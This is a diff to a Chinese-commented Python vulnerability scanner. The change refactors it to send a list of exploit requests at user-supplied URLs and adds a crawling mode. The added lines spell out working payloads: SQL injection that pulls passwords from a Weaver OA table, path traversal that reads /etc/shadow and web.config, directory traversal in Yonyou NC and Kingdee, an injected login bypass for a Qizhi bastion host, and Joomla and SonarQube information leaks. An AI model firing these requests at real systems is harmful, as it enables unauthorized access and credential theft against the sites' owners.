@@ -1,4 +1,7 @@
-from POC import CVE_2020_27986, PocFun
+from urllib.parse import urlparse, urlunparse
+
+import Bug
+from POC import CVE_2020_27986, PocFun, checkPOC
 from POC import CNVD_2021_30167
 from POC import CVE_2021_36749
 import argparse
@@ -22,6 +25,7 @@ par.add_argument('--url', '-u', help='需要扫描的url', default=False)
 par.add_argument('--timeout', '-t', help='指定超时数值,默认为6', default=6, type=int)
 par.add_argument('--thead', '-n', help='线程数,默认为1(暂不开发)', type=int, default=1)
 par.add_argument('--file', '-f', help='批量url文本', default=False)
+par.add_argument('--scraper', '-s', help='自动化爬取url', action='store_true')
 args = par.parse_args()
 
 '''
@@ -32,106 +36,105 @@ if args.url is False and args.file is False:
     par.print_help()
     exit()
 
+def fix_url(url):
+    parsed_url = urlparse(url)
+    if not parsed_url.scheme:
+        parsed_url = parsed_url._replace(scheme='http')
+    if not parsed_url.netloc:
+        raise ValueError("URL格式错误")
+    return urlunparse(parsed_url)
+
 url = args.url
 timeout = args.timeout
 thead = args.thead
 file = args.file
+scraper = args.scraper
 
 # 检测到的漏洞数
 check_num = 0
 
 
 def check_POC(in_url, timeout=6):
-    turl = in_url
+    turl = fix_url(in_url)
+    # turl = in_url
     global check_num
-    if not 'http' in in_url:
-        turl = urlparse(in_url)
-        if not turl.scheme:
-            turl = turl._replace(scheme='http', path=turl.path.strip('/'))  # 填充http头部
-            turl = turl.geturl().replace('///', '//')
+    # if not 'http' in in_url:
+    #     turl = urlparse(in_url)
+    #     if not turl.scheme:
+    #         turl = turl._replace(scheme='http', path=turl.path.strip('/'))  # 填充http头部
+    #         turl = turl.geturl().replace('///', '//')
 
-    re = CVE_2020_27986.SonarQube_data_leak(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
-
-    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
-                           url=turl,
-                           addurl='/api/index.php/v1/config/application?public=true',
-                           includelist='links'
-                           )
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
 
     re = CVE_2021_36749.Apache_Druid_any_path(inurl=turl, timeout=timeout)
-    if '返回成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
 
     re = CNVD_2021_30167.yonyou_nc(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
-
-    re = yonyou_path(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
-
-    re = fanwei_OA_sql(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
-
-    re = BEMS_download(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
 
     re = qzbl_anylogin(url=turl, timeout=timeout)
-    if '成功' == re:
-        main.print_green()
-        check_num = check_num + 1
 
     re = get2017Session(url=turl, timeout=timeout)
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
 
     re = getV11Session(url=turl, timeout=timeout)
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
 
-    re = jdOA_anydownload(url=turl, timeout=timeout)
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
+    re = checkPOC.poc_check('CVE-2023-23752',
+                            turl,
+                            '/api/index.php/v1/config/application?public=true',
+                            expected_keyword='links',
+                            timeout=timeout)
 
-    re = PocFun.pocfuntion(pocname='一米OA 任意文件读取漏洞',
-                           url=turl,
-                           addurl='/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp'
-                           )
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
+    re = checkPOC.poc_check('一米OA 任意文件读取漏洞',
+                            turl,
+                            '/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp',
+                            expected_keyword='警告非法用户',
+                            timeout=timeout)
 
-    re = PocFun.pocfuntion(pocname='CVE-2023-23752',
-                           url=turl,
-                           addurl='/api/index.php/v1/config/application?public=true',
-                           includelist='links'
-                           )
-    if '成功' in re:
-        main.print_green(context=re)
-        check_num = check_num + 1
+    re = checkPOC.poc_check('CVE-2020-27986',
+                            turl,
+                            '/api/settings/values',
+                            expected_keyword=['setting', 'key'],
+                            timeout=timeout)
 
-    main.print_yellow(f'一共检测到{check_num}个漏洞')
+    re = checkPOC.poc_check('泛微OAV8SQL注入',
+                            turl,
+                            '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager',
+                            timeout=timeout)
+
+    re = checkPOC.poc_check('用友NC目录遍历',
+                            turl,
+                            '/NCFindWeb?service=IPreAlertConfigService&filename',
+                            timeout=timeout)
+
+    re = checkPOC.poc_check('金和OA-C6任意文件下载',
+                            turl,
+                            '/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config',
+                            timeout=timeout)
+
+    re = checkPOC.poc_check('金蝶OA目录遍历',
+                            turl,
+                            '/appmonitor/protected/selector/server_file/files?folder=/&suffix=',
+                            expected_keyword='total',
+                            timeout=timeout)
+
+    re = checkPOC.poc_check('齐治堡垒机任意用户登录',
+                            turl,
+                            '/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm',
+                            expected_keyword='nav_sys_message',
+                            timeout=timeout)
+
+    re = checkPOC.poc_check('龙璟科技-电池能量BEMS-任意文件下载漏洞',
+                            turl,
+                            '/api/downloads?fileName=../../../../../../../../etc/shadow',
+                            expected_keyword='::',
+                            timeout=timeout)
+
+    # main.print_yellow(f'一共检测到{check_num}个漏洞')
 
 
 def url_check(in_url):
     main.print_yellow('检测到单链接模式')
-    check_POC(in_url)
+    if scraper:
+        Bug.urlCheck(url=in_url)
+    else:
+        check_POC(in_url)
 
 
 def file_check(in_file):
@@ -142,7 +145,10 @@ def file_check(in_file):
             out_url = file.readline()
             if out_url == '':
                 break
-            check_POC(out_url)
+            if scraper:
+                Bug.urlCheck(url=out_url)
+            else:
+                check_POC(out_url)
     except IOError as e:
         main.print_red('读取错误：' + e)
     except Exception as e:
